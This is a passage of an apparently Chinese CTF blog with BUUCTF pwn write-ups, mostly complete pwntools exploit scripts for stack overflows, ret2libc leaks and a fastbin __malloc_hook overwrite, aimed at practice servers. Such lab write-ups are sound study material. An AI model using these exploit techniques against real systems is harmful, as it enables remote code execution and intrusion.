class="string">&quot;./ciscn_2019_n_5&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:28493&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">sla(<span class="string">&quot;tell me your name&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">40</span> + p64(<span class="number">0x0000000000601080</span>)</span><br><span class="line">sla(<span class="string">&quot;What do you want to say to me?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h3><p>开启 NX, PIE , 没有 Canary</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  others_shellcode checksec shell_asm</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/others_shellcode/shell_asm&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>main函数直接<code>getshell</code>了，这题应该是为了展示shellcode吧</p><h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p>存在NX, 没有PIE, Canary</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_ne_5 checksec ciscn_2019_ne_5</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/ciscn_2019_ne_5/ciscn_2019_ne_5&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><strong>Print函数</strong>中存在<code>system</code></p><p>搜索发现存在<code>sh</code></p><p><img src="buuctf.assets/image-20211030194852369.png" alt="image-20211030194852369"></p><p><strong>AddLog函数</strong>中可以输入log</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">AddLog</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Getflag函数</strong>中存在<code>strcpy</code>, 而这里复制的正是<strong>AddLog函数</strong>中输入的数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">GetFlag</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v3最大为60字节, 而上个函数可以输入128个字节，则可以溢出</p><h4 id="EXP-13"><a href="#EXP-13" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_ne_5&quot;</span>)</span><br><span class="line"><span class="comment"># p = Remote()</span></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_ne_5&quot;</span>)</span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;administrator&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;1&quot;</span> * <span class="number">0x48</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(system_addr) + <span class="string">b&quot;A&quot;</span> * <span class="number">4</span> + p32(sh_addr)</span><br><span class="line">sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Please input new log info:&quot;</span>, payload)</span><br><span class="line">sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  铁人三项(第五赛区)_2018_rop checksec 2018_rop</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/铁人三项(第五赛区)_2018_rop/2018_rop&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>**vulnerable_function()**存在溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而没有<code>sysytem</code>和<code>binsh</code>所以需要溢出找到<code>libc</code>,  从而<code>getshell</code></p><h4 id="EXP-14"><a href="#EXP-14" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25187&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">read_addr = u32(p.recv())</span><br><span class="line">lib = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - lib.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + lib.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">str_bin_sh = libc_base + lib.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">4</span> + p32(system_addr) + p32(main_addr) + p32(str_bin_sh)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h3><p>64位, NX 但没有PIE, Canary, </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  bjdctf_2020_babyrop checksec bjdctf_2020_babyrop</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/bjdctf_2020_babyrop/bjdctf_2020_babyrop&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><strong>vuln函数</strong>存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出泄露libc基址从而getshell</p><h4 id="EXP-15"><a href="#EXP-15" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:29960&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;puts_got =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_got)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">32</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> </span><br><span class="line">payload += p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sla(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>, payload)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_addr = u64(rv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">lib = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">lib_base = puts_addr - lib.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = lib_base + lib.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = lib_base + lib.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;system_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;str_bin_sh =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(str_bin_sh)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">32</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(str_bin_sh) + p64(system_addr)</span><br><span class="line">sla(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Node *Nodes; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  Nodes = (Node *)Init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Menu();</span><br><span class="line">    <span class="keyword">switch</span> ( read_int() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        Allocate(Nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        Fill(Nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        Free(Nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        Dump(Nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>其中<strong>Fill函数</strong>存在问题，size可以自己设定</li><li>需要注意的是<strong>Allocate函数</strong>使用<code>calloc</code>函数, 分配内存后会把数据区域全部置零</li></ul><p>攻击思路: 伪造堆块送入<code>unsorted bin</code>, 其首个<code>free</code>掉的chunk会指向<code>main_arena + 0x58</code>的固定地址，而从而泄露<code>main_arena</code>, 从而泄露libc基址</p><h4 id="EXP-16"><a href="#EXP-16" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyheap_0ctf_2017&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25195&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    ru(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    ru(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span>(<span class="params">idx</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    ru(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x000000000000113D)&quot;)</span></span><br><span class="line"></span><br><span class="line">Allocate(<span class="number">0x60</span>)  <span class="comment"># 0</span></span><br><span class="line">Allocate(<span class="number">0x40</span>)  <span class="comment"># 1</span></span><br><span class="line">Allocate(<span class="number">0x100</span>) <span class="comment"># 2</span></span><br><span class="line">Fill(<span class="number">0</span>, <span class="number">0x60</span> * <span class="string">b&quot;A&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># chunk1.size &lt;&lt;= 0x71</span></span><br><span class="line">Fill(<span class="number">2</span>, <span class="number">0x10</span> * <span class="string">b&quot;B&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># pass check</span></span><br><span class="line"></span><br><span class="line">Free(<span class="number">1</span>) <span class="comment"># free chunk1 to fastbin</span></span><br><span class="line">Allocate(<span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">Fill(<span class="number">1</span>, <span class="number">0x40</span> * <span class="string">b&quot;C&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">Allocate(<span class="number">0x100</span>)</span><br><span class="line">Free(<span class="number">2</span>)</span><br><span class="line">Dump(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">f&quot;main_arena =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(main_arena)&#125;</span>&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">offset = <span class="number">0x3c4b20</span></span><br><span class="line">lib.address = main_arena - offset</span><br><span class="line">log.success(<span class="string">f&quot;lib_address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line">malloc_hook_addr = lib.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;malloc_hook_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(malloc_hook_addr)&#125;</span>&quot;</span>)</span><br><span class="line">fake_chunk = malloc_hook_addr - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Fill(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(fake_chunk) + p64(<span class="number">0</span>))</span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">Fill(<span class="number">2</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(lib.address + one_gadgets[<span class="number">1</span>]))</span><br><span class="line">Allocate(<span class="number">0x100</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>主函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105163410067.png" alt="image-20211105163410067"></p><ul><li><code>nbytes</code>为size_t类型，但与10对比时类型转换为了int，那么我们可以输入负数使得可以过检测，且下方read溢出</li></ul><p>溢出到后面函数即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105163634607.png" alt="image-20211105163634607"></p><h4 id="EXP-17"><a href="#EXP-17" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bjdctf_2020_babystack2&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:29567&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span 